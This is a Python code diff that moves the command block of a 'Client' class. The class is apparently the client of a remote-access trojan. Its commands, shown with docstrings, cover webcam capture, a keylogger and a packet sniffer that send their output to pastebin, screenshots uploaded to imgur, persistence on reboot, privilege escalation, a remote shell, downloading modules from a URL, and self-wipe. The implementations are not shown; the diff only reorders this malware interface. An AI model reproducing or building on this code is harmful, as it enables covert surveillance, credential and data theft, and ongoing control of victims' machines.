@@ -63,6 +63,182 @@ class Client(object):
         self._commands  = {cmd: getattr(self, cmd) for cmd in __command__}
         self._result    = {mod: dict({}) for mod in self._modules}
 
+    # ------------------ commands --------------------------
+
+    @_command
+    def cd(self, *x):
+        """change directory"""
+        return self._cd(*x)
+
+    @_command
+    def set(self, x):
+        """set module options"""
+        return self._set(x)
+
+    @_command
+    def ls(self, *x):
+        """list directory contents"""
+        return self._ls(*x)
+
+    @_command
+    def pwd(self):
+        """\tpresent working directory"""
+        return os.getcwd()
+
+    @_command
+    def cat(self, *x):
+        """\tdisplay file contents"""
+        return self._cat(*x)
+
+    @_command
+    def run(self):
+        """\trun enabled client modules"""
+        return self._run()
+
+    @_command
+    def new(self, x):
+        """download new module from url"""
+        return self._new(x)
+
+    @_command
+    def kill(self):
+        """\tkill client and wipe"""
+        return self._kill()
+    
+    @_command
+    def show(self, x):
+        """show client attributes"""
+        return self._show(x)
+
+    @_command
+    def wget(self, url):
+        """download file from url"""
+        return self._wget(url)
+
+    @_command
+    def jobs(self):
+        """\tlist currently active jobs"""
+        return self._show(self._threads)
+
+    @_command
+    def admin(self):
+        """\tattempt to escalate privileges"""
+        return self._admin()
+    
+    @_command
+    def start(self):
+        """\tstart client"""
+        return self._start()
+    
+    @_command
+    def shell(self):
+        """\trun client shell"""
+        return self._shell()
+    
+    @_command
+    def standby(self):
+        """revert to standby mode"""
+        return self._standby()
+
+    @_command
+    def options(self,*arg):
+        """display module options"""
+        return self._options(*arg)
+    
+    @_command
+    def enable(self, *modules):
+        """enable module"""
+        return self._enable(*modules)
+
+    @_command
+    def disable(self, *modules):
+        """disable module"""
+        return self._disable(*modules)
+
+    @_command
+    def results(self):
+        """show all modules output"""
+        return self._show(self._result)
+
+    @_command
+    def status(self):
+        """\tget client session status"""
+        return self._status()
+
+    @_command
+    def help(self, *args):
+        """show command usage information"""
+        return self._help(*args)
+
+    @_command
+    def info(self):
+        """\tget client host machine information"""
+        return self._show(self._info)
+
+    @_command
+    def commands(self):
+        """list commands with usage help"""
+        return self._help_command()
+
+    @_command
+    def modules(self):
+        """list modules current status"""
+        return self._help_modules()
+
+    @_command
+    def webcam(self):
+        """\tremote image/video capture from client webcam"""
+        return self._webcam()
+    
+    @_command
+    def keylogger(self):
+        """log client keystrokes remotely and dump to pastebin"""
+        return self._keylogger()
+
+    @_command
+    def screenshot(self):
+        """take screenshot and upload to imgur"""
+        return self._screenshot()
+
+    @_command
+    def persistence(self):
+        """establish persistence to relaunch on reboot"""
+        return self._persistence()
+    
+    @_command
+    def packetsniff(self):
+        """capture client network traffic and dump to pastebin"""
+        return self._packetsniff()
+
+    pwd.usage           = 'pwd'
+    run.usage           = 'run'
+    kill.usage          = 'kill'
+    info.usage          = 'info'
+    jobs.usage          = 'jobs'
+    admin.usage         = 'admin'
+    start.usage         = 'start'
+    shell.usage         = 'shell'
+    webcam.usage        = 'webcam'
+    status.usage        = 'status'
+    options.usage       = 'options'
+    results.usage       = 'results'
+    standby.usage       = 'standby'
+    modules.usage       = 'modules'
+    commands.usage      = 'commands'
+    keylogger.usage     = 'keylogger'
+    screenshot.usage    = 'screenshot'
+    persistence.usage   = 'persistence'
+    packetsniff.usage   = 'packetsniff'
+    cd.usage            = 'cd <path>'
+    new.usage           = 'new <url>'
+    set.usage           = 'set <cmd> x=y'
+    help.usage          = 'help <option>'
+    show.usage          = 'show <option>'
+    ls.usage            = 'ls <path>'
+    wget.usage          = 'wget <url>'
+    disable.usage       = 'disable <cmd>'
+    enable.usage        = 'enable <cmd>'
+
     # ------------------- private functions -------------------------
 
     def _help(self, *arg): return '\n ' + '\n '.join(['{}\t\t{}'.format(i.usage, i.func_doc) for i in self._commands.values()])
@@ -932,182 +1108,6 @@ class Client(object):
             return True
         except: pass
         return False
-
-    # ------------------ commands --------------------------
-
-    pwd.usage           = 'pwd'
-    run.usage           = 'run'
-    kill.usage          = 'kill'
-    info.usage          = 'info'
-    jobs.usage          = 'jobs'
-    admin.usage         = 'admin'
-    start.usage         = 'start'
-    shell.usage         = 'shell'
-    webcam.usage        = 'webcam'
-    status.usage        = 'status'
-    options.usage       = 'options'
-    results.usage       = 'results'
-    standby.usage       = 'standby'
-    modules.usage       = 'modules'
-    commands.usage      = 'commands'
-    keylogger.usage     = 'keylogger'
-    screenshot.usage    = 'screenshot'
-    persistence.usage   = 'persistence'
-    packetsniff.usage   = 'packetsniff'
-    cd.usage            = 'cd <path>'
-    new.usage           = 'new <url>'
-    set.usage           = 'set <cmd> x=y'
-    help.usage          = 'help <option>'
-    show.usage          = 'show <option>'
-    ls.usage            = 'ls <path>'
-    wget.usage          = 'wget <url>'
-    disable.usage       = 'disable <cmd>'
-    enable.usage        = 'enable <cmd>'
-
-    @_command
-    def cd(self, *x):
-        """change directory"""
-        return self._cd(*x)
-
-    @_command
-    def set(self, x):
-        """set module options"""
-        return self._set(x)
-
-    @_command
-    def ls(self, *x):
-        """list directory contents"""
-        return self._ls(*x)
-
-    @_command
-    def pwd(self):
-        """\tpresent working directory"""
-        return os.getcwd()
-
-    @_command
-    def cat(self, *x):
-        """\tdisplay file contents"""
-        return self._cat(*x)
-
-    @_command
-    def run(self):
-        """\trun enabled client modules"""
-        return self._run()
-
-    @_command
-    def new(self, x):
-        """download new module from url"""
-        return self._new(x)
-
-    @_command
-    def kill(self):
-        """\tkill client and wipe"""
-        return self._kill()
-    
-    @_command
-    def show(self, x):
-        """show client attributes"""
-        return self._show(x)
-
-    @_command
-    def wget(self, url):
-        """download file from url"""
-        return self._wget(url)
-
-    @_command
-    def jobs(self):
-        """\tlist currently active jobs"""
-        return self._show(self._threads)
-
-    @_command
-    def admin(self):
-        """\tattempt to escalate privileges"""
-        return self._admin()
-    
-    @_command
-    def start(self):
-        """\tstart client"""
-        return self._start()
-    
-    @_command
-    def shell(self):
-        """\trun client shell"""
-        return self._shell()
-    
-    @_command
-    def standby(self):
-        """revert to standby mode"""
-        return self._standby()
-
-    @_command
-    def options(self,*arg):
-        """display module options"""
-        return self._options(*arg)
-    
-    @_command
-    def enable(self, *modules):
-        """enable module"""
-        return self._enable(*modules)
-
-    @_command
-    def disable(self, *modules):
-        """disable module"""
-        return self._disable(*modules)
-
-    @_command
-    def results(self):
-        """show all modules output"""
-        return self._show(self._result)
-
-    @_command
-    def status(self):
-        """\tget client session status"""
-        return self._status()
-
-    @_command
-    def help(self, *args):
-        """show command usage information"""
-        return self._help(*args)
-
-    @_command
-    def info(self):
-        """\tget client host machine information"""
-        return self._show(self._info)
-
-    @_command
-    def commands(self):
-        """list commands with usage help"""
-        return self._help_command()
-
-    @_command
-    def modules(self):
-        """list modules current status"""
-        return self._help_modules()
-
-    @_command
-    def webcam(self):
-        """\tremote image/video capture from client webcam"""
-        return self._webcam()
-    
-    @_command
-    def keylogger(self):
-        """log client keystrokes remotely and dump to pastebin"""
-        return self._keylogger()
-
-    @_command
-    def screenshot(self):
-        """take screenshot and upload to imgur"""
-        return self._screenshot()
-
-    @_command
-    def persistence(self):
-        """establish persistence to relaunch on reboot"""
-        return self._persistence()
-    
-    @_command
-    def packetsniff(self):
-        """capture client network traffic and dump to pastebin"""
-        return self._packetsniff()
 
 # -----------------   main   --------------------------
 
